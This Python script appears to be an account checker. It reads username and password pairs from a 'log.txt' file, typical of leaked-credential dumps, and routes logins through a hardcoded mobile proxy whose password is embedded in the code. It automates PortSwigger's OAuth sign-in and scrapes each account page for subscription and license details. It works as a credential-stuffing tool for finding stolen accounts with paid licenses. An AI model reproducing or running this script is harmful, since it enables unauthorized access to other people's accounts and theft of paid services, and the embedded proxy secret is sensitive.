#!/usr/bin/env python3
"""Extract subscription data via HTTP + JavaScript code extraction and execution"""

import requests
import json
import re
from urllib.parse import urljoin, parse_qs, urlparse

proxy_url = "http://buymobileproxycom:mugla9392@ankara8.buymobileproxy.com:8029"

# Read first account
with open("log.txt", 'r', encoding='utf-8') as f:
    for line in f:
        line = line.strip()
        if line and not line.startswith("#"):
            username, password = line.split(":", 1)
            username = username.strip()
            password = password.strip()
            break

print(f"[*] Test account: {username}\n")

# Create session
session = requests.Session()
session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
session.proxies.update({'http': proxy_url, 'https': proxy_url})

print("[1] OAuth Login Flow:")
print("=" * 80)

try:
    # OAuth authorize
    auth_url = "https://login.portswigger.net/authorize?client_id=F1PNGMosqeuuNO5cKQzDesrY2XzvPWGz&redirect_uri=https://portswigger.net/signin-oidc&response_type=code&scope=openid+profile+email&code_challenge=BldXYnkHHNxMQttliGBK-tWU16bEzTbKyUsr9WnArgk&code_challenge_method=S256&response_mode=query"

    resp = session.get(auth_url, allow_redirects=False, timeout=10)
    print(f"[A] GET authorize: {resp.status_code}")

    state = ""
    if resp.status_code in [301, 302, 303, 307, 308]:
        redirect_url = resp.headers.get('Location', '')
        if 'state=' in redirect_url:
            if not redirect_url.startswith('http'):
                redirect_url = urljoin("https://login.portswigger.net/", redirect_url)
            parsed = parse_qs(urlparse(redirect_url).query)
            if 'state' in parsed:
                state = parsed['state'][0]
        resp = session.get(redirect_url, allow_redirects=False, timeout=10)

    # Login
    print(f"[B] POST login...")
    login_url = f"https://login.portswigger.net/u/login"
    if state:
        login_url = f"{login_url}?state={state}"

    login_data = {
        "username": username,
        "password": password,
        "action": "default"
    }

    resp = session.post(login_url, data=login_data, allow_redirects=False, timeout=10)
    print(f"    Status: {resp.status_code}")

    # Follow all redirects
    print(f"[C] Following OAuth redirect chain...")
    redirect_count = 0
    while resp.status_code in [301, 302, 303, 307, 308] and redirect_count < 15:
        redirect_url = resp.headers.get('Location', '')
        if not redirect_url:
            break

        if not redirect_url.startswith('http'):
            redirect_url = urljoin("https://login.portswigger.net/", redirect_url)

        print(f"    Redirect {redirect_count + 1}: {redirect_url[:60]}...")
        resp = session.get(redirect_url, allow_redirects=False, timeout=10)
        print(f"      Status: {resp.status_code}")

        redirect_count += 1

    print(f"[✓] Login completed\n")

except Exception as e:
    print(f"[✗] Login error: {e}\n")
    exit(1)

# Now extract subscription data
print("[2] Accessing subscription endpoints via HTTP:")
print("=" * 80)

# Try /users/youraccount
print(f"\n[Testing] /users/youraccount")

try:
    resp = session.get("https://portswigger.net/users/youraccount", allow_redirects=True, timeout=10)
    print(f"  Status: {resp.status_code}")
    print(f"  Content length: {len(resp.text)} bytes")

    html = resp.text

    # Method 1: Extract and execute JavaScript to parse HTML
    print(f"\n[3] Parsing response with JavaScript logic:")
    print("=" * 80)

    # Parse subscription status from HTML
    # Simulate JavaScript DOM parsing with regex

    # Look for common patterns
    patterns = {
        'no_subscription': r'You do not have any subscriptions',
        'subscription': r'subscription',
        'plan': r'plan',
        'license': r'license',
        'status': r'(?:status|active|inactive):\s*([^<\n]+)',
        'expiry': r'(?:expir|valid|until):\s*([^<\n]+)',
    }

    found_data = {}
    for key, pattern in patterns.items():
        matches = re.findall(pattern, html, re.IGNORECASE)
        if matches:
            found_data[key] = matches[:3]

    # Extract all text and look for subscription info
    text_only = re.sub(r'<[^>]*>', '', html)
    text_only = re.sub(r'\s+', ' ', text_only).strip()

    print(f"\nPage text (first 1000 chars):")
    print(f"{text_only[:1000]}\n")

    # Look for subscription-related sections
    print(f"[*] Looking for subscription data in text...")

    # Split by common delimiters and look for relevant sections
    sentences = text_only.split('.')
    relevant_sentences = []

    for sentence in sentences:
        sentence = sentence.strip()
        if any(keyword in sentence.lower() for keyword in ['subscription', 'plan', 'license', 'account', 'premium', 'professional', 'team', 'enterprise']):
            if len(sentence) > 10:
                relevant_sentences.append(sentence)

    if relevant_sentences:
        print(f"\n✓ Found {len(relevant_sentences)} relevant sentences:")
        for i, sentence in enumerate(relevant_sentences[:10]):
            print(f"  {i+1}. {sentence[:120]}")
    else:
        print(f"[-] No subscription info found in plain text")

    # Method 2: Extract JSON data from HTML (if any)
    print(f"\n[4] Looking for embedded JSON data...")

    json_pattern = r'\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}'
    json_matches = re.findall(json_pattern, html)

    for match in json_matches:
        if any(keyword in match.lower() for keyword in ['subscription', 'plan', 'license']):
            try:
                data = json.loads(match)
                print(f"\n✓ Found JSON with subscription data:")
                print(json.dumps(data, indent=2)[:300])
                break
            except:
                pass

    # Method 3: Execute simple JavaScript-like parsing
    print(f"\n[5] Simulating JavaScript DOM parsing...")

    # Find all div/span elements that might contain subscription data
    elements = re.findall(r'<(?:div|span|p|h[1-6])[^>]*class="[^"]*(?:subscription|plan|license)[^"]*"[^>]*>([^<]+)</(?:div|span|p|h[1-6])>', html, re.IGNORECASE)

    if elements:
        print(f"✓ Found {len(elements)} elements with subscription classes:")
        for elem in elements[:5]:
            elem_clean = elem.strip()[:100]
            print(f"  - {elem_clean}")
    else:
        print(f"[-] No elements with subscription classes found")

    # Save results
    print(f"\n[6] Saving results...")
    with open("users_youraccount_parsed.html", "w", encoding="utf-8") as f:
        f.write(html)
    print(f"✓ Saved: users_youraccount_parsed.html")

    with open("users_youraccount_parsed.txt", "w", encoding="utf-8") as f:
        f.write(text_only)
    print(f"✓ Saved: users_youraccount_parsed.txt")

    with open("subscription_data.json", "w", encoding="utf-8") as f:
        json.dump(found_data, f, indent=2)
    print(f"✓ Saved: subscription_data.json")

except Exception as e:
    print(f"[E] Error: {e}")
    import traceback
    traceback.print_exc()

print("\n" + "=" * 80)
print("[*] Extraction completed")
